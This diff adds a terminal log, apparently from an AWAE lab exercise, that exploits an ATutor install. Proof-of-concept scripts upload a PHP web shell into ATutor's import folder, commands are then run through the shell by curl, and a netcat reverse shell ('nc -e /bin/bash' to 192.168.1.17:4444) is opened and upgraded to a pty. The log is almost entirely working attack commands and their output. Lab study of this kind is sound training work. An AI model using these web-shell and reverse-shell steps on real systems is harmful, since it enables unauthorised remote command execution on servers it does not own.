@@ -1,0 +1,52 @@
+$ python3 /home/rockylinux/Documents/AWAE/3.10/poc1.py
+
+
+
+$ sudo find /opt -name poc1.php4
+/opt/lampp/htdocs/ATutor/content/import/1/poc1/poc1.php4
+
+
+
+$ python3 /home/rockylinux/Documents/AWAE/3.10/poc2.py
+
+
+
+$ sudo find /opt -name obfuscated-phpshell.php4
+/opt/lampp/htdocs/ATutor/content/import/1/obfuscated-phpshell.php4
+
+
+
+$ curl -X POST http://localhost/ATutor/content/import/1/obfuscated-phpshell.php4 -d 'password=lol&cmd=id'
+uid=2(daemon) gid=2(daemon) groups=2(daemon) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+
+
+$ curl -X POST http://192.168.1.26/ATutor/content/import/1/obfuscated-phpshell.php4 -d 'password=lol&cmd=id'
+uid=2(daemon) gid=2(daemon) groups=2(daemon) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
+
+
+
+$ curl -X POST http://192.168.1.26/ATutor/content/import/1/obfuscated-phpshell.php4 -d 'password=lol&cmd=which+nc'
+/bin/nc
+
+
+
+$ nc -nlvp 4444
+
+
+
+$ curl -X POST http://192.168.1.26/ATutor/content/import/1/obfuscated-phpshell.php4 -d 'password=lol&cmd=nc+-e+/bin/bash+192.168.1.17+4444'
+
+
+
+which python3
+
+
+
+python3 -c 'import pty; pty.spawn("/bin/bash");'
+
+
+
+bash-4.4$ id
+id
+uid=2(daemon) gid=2(daemon) groups=2(daemon) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
